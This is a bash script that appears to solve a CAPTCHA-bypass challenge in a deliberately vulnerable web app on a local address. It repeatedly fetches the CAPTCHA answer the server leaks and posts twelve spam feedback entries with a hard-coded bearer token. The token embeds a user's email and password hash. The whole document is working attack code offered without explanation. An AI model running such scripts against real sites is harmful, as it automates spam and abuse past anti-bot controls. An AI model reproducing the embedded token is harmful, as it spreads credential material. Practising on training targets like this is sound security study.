#!/usr/bin/env bash

for i in `seq 1 12`;
do
  CAPTCHA=$(curl -s 'http://172.16.189.131:3000/rest/captcha/')
  ID=$(echo $CAPTCHA | jq '.captchaId')
  ANSWER=$(echo $CAPTCHA | jq '.answer')

  PAYLOAD="{\"UserId\":15,\"captchaId\":${ID},\"captcha\":${ANSWER},\"comment\":\"SPAM TIME!\",\"rating\":1}"
  echo "Sending Payload: $PAYLOAD"

  curl -s -i 'http://172.16.189.131:3000/api/Feedbacks/' --data-binary "$PAYLOAD" -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MTUsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJzb21lb25lQHNvbWV0aGluZy5pbyIsInBhc3N3b3JkIjoiYjQ0NDg3NjJmYzg3N2MyZDU3YjJjOTcyMzExOGQyNjQiLCJpc0FkbWluIjpmYWxzZSwibGFzdExvZ2luSXAiOiIwLjAuMC4wIiwicHJvZmlsZUltYWdlIjoiZGVmYXVsdC5zdmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMTktMDgtMTYgMTQ6MTQ6NDEuNjQ0ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMTktMDgtMTYgMTQ6MTQ6NDEuNjQ0ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTU2NTk2NDg4NywiZXhwIjoxNTY1OTgyODg3fQ.yrMNcK3M0fcQPNQtQ-2cleiL7_6VIRjPzXpiXWGoiEW9leNHxcmHCUAZuj60icVIeekJp3o9H5cItRR9YGNXL-8I_JU-GzTNeXkEPo_QHj-7lznKorEbGJzLd5IQxFRPG5wJsyNZMeL-4zTGkobkTEvKNu1P7FVwiCoo3SuL10k' -H 'Content-Type: application/json' | ghead -n 1
done
